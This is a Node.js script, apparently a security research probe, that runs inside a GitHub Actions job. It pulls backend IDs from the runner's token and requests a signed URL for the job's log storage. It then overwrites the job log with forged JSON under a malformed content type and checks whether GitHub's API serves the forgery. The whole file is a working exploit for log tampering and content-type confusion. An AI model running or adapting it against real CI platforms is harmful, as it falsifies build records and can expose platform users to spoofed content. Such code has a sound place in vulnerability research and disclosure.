import https from 'node:https';
import crypto from 'node:crypto';

const token = process.env.ACTIONS_RUNTIME_TOKEN;
const base = process.env.ACTIONS_RESULTS_URL;
const repo = process.env.GITHUB_REPOSITORY;
const runId = process.env.GITHUB_RUN_ID;
const ghToken = process.env.GITHUB_TOKEN;
if (!token || !base || !repo || !runId || !ghToken) throw Error('missing Actions environment');

const request = (url, options = {}, body) => new Promise((resolve, reject) => {
  const req = https.request(url, options, res => {
    const chunks = [];
    res.on('data', x => chunks.push(x));
    res.on('end', () => resolve({status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks)}));
  });
  req.setTimeout(20000, () => req.destroy(Error('timeout')));
  req.on('error', reject);
  if (body !== undefined) req.write(body);
  req.end();
});
const sleep = ms => new Promise(r => setTimeout(r, ms));
const typeHex = r => Buffer.from(r?.headers?.['content-type'] || '', 'latin1').toString('hex');
const typeCodepoints = r => Array.from(r?.headers?.['content-type'] || '', c => c.codePointAt(0).toString(16));
const sha = b => crypto.createHash('sha256').update(b).digest('hex');
const api = path => request(`https://api.github.com/repos/${repo}${path}`, {
  headers: {authorization: `Bearer ${ghToken}`, accept: 'application/vnd.github.v3+json', 'user-agent': 'cassette-job-log-probe'},
});
const twirp = (name, obj) => {
  const body = Buffer.from(JSON.stringify(obj));
  return request(new URL(`/twirp/results.services.receiver.Receiver/${name}`, base), {
    method: 'POST', headers: {authorization: `Bearer ${token}`, 'content-type': 'application/json', 'content-length': body.length},
  }, body);
};

const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
const scope = claims.scp.split(' ').find(s => s.startsWith('Actions.Results:'));
if (!scope) throw Error('missing results scope');
const [, workflow_run_backend_id, workflow_job_run_backend_id] = scope.split(':');
const identity = {workflow_run_backend_id, workflow_job_run_backend_id};

let jobId;
for (let i = 0; i < 30 && !jobId; i++) {
  const r = await api(`/actions/runs/${runId}/jobs?filter=all`);
  if (r.status === 200) jobId = JSON.parse(r.body).jobs?.find(j => j.name === 'carrier')?.id;
  if (!jobId) await sleep(300);
}
if (!jobId) throw Error('job ID unavailable');

const signedResponse = await twirp('GetJobLogsSignedBlobURL', identity);
if (signedResponse.status !== 200) throw Error(`GetJobLogsSignedBlobURL ${signedResponse.status}`);
const signedUrl = JSON.parse(signedResponse.body).logs_url;
if (!signedUrl) throw Error('no signed URL');
const parsedSigned = new URL(signedUrl);

const repository = `${repo}/actions/jobs/${jobId}/logs`;
const expected = Buffer.from(JSON.stringify({
  full_name: repository,
  owner: {login: 'cassette', avatar_url: 'https://github.com/favicon.ico'},
  description: 'Repo Cassette job log carrier probe',
  stargazers_count: 0,
}));
const desiredType = '\x85application/json';
const appendUrl = new URL(signedUrl);
appendUrl.searchParams.set('comp', 'appendblock');

async function overwrite() {
  let mode = 'content-type';
  let initialize = await request(signedUrl, {method: 'PUT', headers: {
    'x-ms-version': '2023-11-03', 'x-ms-blob-type': 'AppendBlob',
    'content-type': desiredType, 'content-length': 0,
  }});
  if (initialize.status !== 201) {
    mode = 'x-ms-blob-content-type';
    initialize = await request(signedUrl, {method: 'PUT', headers: {
      'x-ms-version': '2023-11-03', 'x-ms-blob-type': 'AppendBlob',
      'x-ms-blob-content-type': desiredType, 'content-length': 0,
    }});
  }
  if (initialize.status !== 201) return {initialize: initialize.status, append: null, mode};
  const append = await request(appendUrl, {method: 'PUT', headers: {
    'x-ms-version': '2023-11-03', 'content-type': 'application/octet-stream',
    'content-length': expected.length, 'x-ms-blob-condition-appendpos': '0',
  }}, expected);
  return {initialize: initialize.status, append: append.status, mode};
}

const before = await request(signedUrl);
const restBefore = await api(`/actions/jobs/${jobId}/logs`);
const restBeforeUrl = restBefore.status === 302 && restBefore.headers.location ? new URL(restBefore.headers.location) : null;
const restBeforeBlob = restBeforeUrl ? await request(restBeforeUrl) : null;
const first = await overwrite();
const after = await request(signedUrl);
const meta = await twirp('CreateJobLogsMetadata', {...identity, uploaded_at: new Date().toISOString(), line_count: 1});
let rest = await api(`/actions/jobs/${jobId}/logs`);
let final = null;
if (rest.status === 302 && rest.headers.location) final = await request(rest.headers.location);
const versioned = [];
const githubVersioned = [];
if (rest.status === 302 && rest.headers.location) {
  for (const version of ['2009-09-19', '2011-08-18', '2012-02-12', '2013-08-15', '2014-02-14', '2015-02-21']) {
    const url = new URL(rest.headers.location);
    url.searchParams.set('api-version', version);
    try {
      const response = await request(url);
      versioned.push({version, status: response.status, typeHex: typeHex(response), typeCodepoints: typeCodepoints(response), blobType: response.headers['x-ms-blob-type'], bodyMatch: response.body.equals(expected)});
    } catch (error) {
      versioned.push({version, error: error.code || error.name});
    }
    try {
      const routed = await api(`/actions/jobs/${jobId}/logs?api-version=${version}`);
      const routedUrl = routed.status === 302 && routed.headers.location ? new URL(routed.headers.location) : null;
      const routedBlob = routedUrl ? await request(routedUrl) : null;
      githubVersioned.push({version, restStatus: routed.status,
        sameBlob: routedUrl && routedUrl.host === parsedSigned.host && routedUrl.pathname === parsedSigned.pathname,
        hasRsct: routedUrl?.searchParams.has('rsct') || false,
        hasApiVersion: routedUrl?.searchParams.has('api-version') || false,
        blobStatus: routedBlob?.status, typeHex: typeHex(routedBlob), typeCodepoints: typeCodepoints(routedBlob), blobType: routedBlob?.headers['x-ms-blob-type'],
        bodyMatch: routedBlob?.body.equals(expected)});
    } catch (error) {
      githubVersioned.push({version, error: error.code || error.name});
    }
  }
}
console.log('JOB-LOG-PROBE', JSON.stringify({
  jobId, repository, expectedSha: sha(expected),
  signedPermissions: parsedSigned.searchParams.get('sp'),
  signedHasRsct: parsedSigned.searchParams.has('rsct'),
  before: {status: before.status, typeHex: typeHex(before), blobType: before.headers['x-ms-blob-type'], length: before.body.length},
  restBefore: {status: restBefore.status,
    sameBlob: restBeforeUrl && restBeforeUrl.host === parsedSigned.host && restBeforeUrl.pathname === parsedSigned.pathname,
    hasRsct: restBeforeUrl?.searchParams.has('rsct') || false,
    blobStatus: restBeforeBlob?.status, blobTypeHex: typeHex(restBeforeBlob), blobLength: restBeforeBlob?.body.length},
  first, after: {status: after.status, typeHex: typeHex(after), typeCodepoints: typeCodepoints(after), blobType: after.headers['x-ms-blob-type'], bodyMatch: after.body.equals(expected)},
  metadataStatus: meta.status, restStatus: rest.status,
  restHasRsct: Boolean(rest.headers.location && new URL(rest.headers.location).searchParams.has('rsct')),
  final: final && {status: final.status, typeHex: typeHex(final), typeCodepoints: typeCodepoints(final), blobType: final.headers['x-ms-blob-type'], bodyMatch: final.body.equals(expected)},
  versioned,
  githubVersioned,
}));

// Restore the carrier after the diagnostic line has been flushed to the runner.
await sleep(1000);
await overwrite();
